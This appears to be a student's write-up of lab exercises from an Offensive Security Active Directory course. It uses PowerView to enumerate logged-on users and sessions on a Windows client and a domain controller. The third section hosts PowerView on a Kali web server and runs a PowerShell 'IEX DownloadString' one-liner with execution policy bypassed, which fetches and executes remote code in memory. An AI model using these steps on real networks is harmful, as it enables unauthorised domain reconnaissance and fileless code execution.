21.2.4.1

# 21.2.4.1.1. Download and use PowerView to perform the same enumeration against the student VM while in the context of the Offsec account.

Install and import Powerview
`PS C:\Tools\active_directory> Import-Module .\PowerView.ps1`
![3bdb2a7fce8d5a00aa757e8ad901c34f.png](4bcd0080f38b4091b3fcbb56408a0342.png)

Enumerate logged-in users to specify the target workstation or server. In this example, we target the Windows 10 client, using -ComputerName client251. We see that offsec user has an active session
`PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251`
![e5c0b68536eb89b98e27da2e9d4d7699.png](ca166f6fab684733b7cd08d871095477.png)

Now retrieve active sessions on the domain controller DC01. As expected, we see offsec has an active log in.
`PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01`
![d490deb70806c8cf84baca795c2b4642.png](b454d72d04f144ffa1dd1b05f50a394d.png)



# 21.2.4.1.2. Log in to the student VM with the Jeff_Admin account and perform a remote desktop login to the domain controller using the Jeff_Admin account. Next, execute the Get-NetLoggedOn function on the student VM to discover logged-in users on the domain controller while in the context of the Jeff_Admin account.

Rdesktop to the Windows client as jeff_admin
![8e1e776703da37ca8bf667deea24f3da.png](38d2ef416b7f4f4cb6509e1171141f81.png)
![1efcd97b08970e05ad6039e9a033070e.png](f72124b5c7c64d0e81dc97670c23a40b.png)

Enumerate the logged-in users on the domain controller. We see that Administrator is logged in.
`PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName dc01`
![674a9a1ff8fdc9707fd8a533a26bdf65.png](8929bee7f8b04266956e162f2e50c285.png)

For curiosity, I ran the Get-Netsession as well. We see jeff_admin is active.
`PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01`
![16746880ed839f3f324976b029568421.png](647ffbd66d894fdb83d38e179187ca4c.png)



# 21.2.4.1.3. Repeat the enumeration by using the DownloadString method from the System.Net.WebClient class in order to download PowerView from your Kali system and execute it in memory without saving it to the hard disk.

Locate powerview.ps1 on Kali
```plaintext
kali@kali:~$ locate powerview.ps1
/usr/share/powershell-empire/data/module_source/situational_awareness/network/powerview.ps1
kali@kali:~$
```

On Kali, move powerview.ps1 to Apache web server
```plaintext
kali@kali:~$ sudo cp /usr/share/powershell-empire/data/module_source/situational_awareness/network/powerview.ps1 /var/www/html
```

Start Apache web server on Kali
```plaintext
kali@kali:~$ sudo systemctl start apache2
```

### Log in as user offsec
rdesktop into Windows client as offsec
`rdesktop 192.168.214.10 -u offsec`
![66aa85e944e46c64059e949b396eab3c.png](b4c7b93a554b43098ed89d5420992378.png)

Sign in as domain user corp\offsec
![6eb6a45d6138cf8daa6fa22d9ea5f0f0.png](eb3855f452394fb5b03260790d3b01c1.png)

Use the DownloadString method to download PowerView from Kali and execute it in memory without saving it to hard disk.
`powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.214/powerview.ps1')"`

Enumerate logged-in users to specify the target workstation or server. In this example, we target the Windows 10 client, using -ComputerName client251. We see that offsec user has an active session
`PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251`
![0caff4f310a1ce6e8913079ece46b9fd.png](327c3f8208dd49d088e39bcf41209884.png)

Now retrieve active sessions on the domain controller DC01. As expected, we see offsec has an active log in.
`PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01`
![b1423d7d4879f7629951002d5554f8d0.png](d737897abc6a41c3b13a2a98be5d39dc.png)


### Log in as user jeff_admin
Log in as jeff_admin on the Windows client
![023cac491cad7f35a7dd7bbe2099f7f8.png](14a64b3d0afa4b509649882f3b498f97.png)

Run the DownloadString method to download PowerView from Kali and execute it in memory without saving it to hard disk.
`powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.214/powerview.ps1')"`

Enumerate logged-in users to specify the target workstation or server. In this example, we target the Windows 10 client, using -ComputerName client251. We see that jeff_admin user has an active session
`PS C:\Users\jeff_admin> Get-NetLoggedon -ComputerName client251`
![51a8a08f975839a190c92e257f5a1d51.png](30b3c2d6f56b49609076734e70ce400b.png)

Now retrieve active sessions on the domain controller DC01. As expected, we see jeff_admin has an active log in.
`PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01`
![4a5e042c43fc76115106158dc01417a9.png](482859240da245118384104bd725bfc6.png)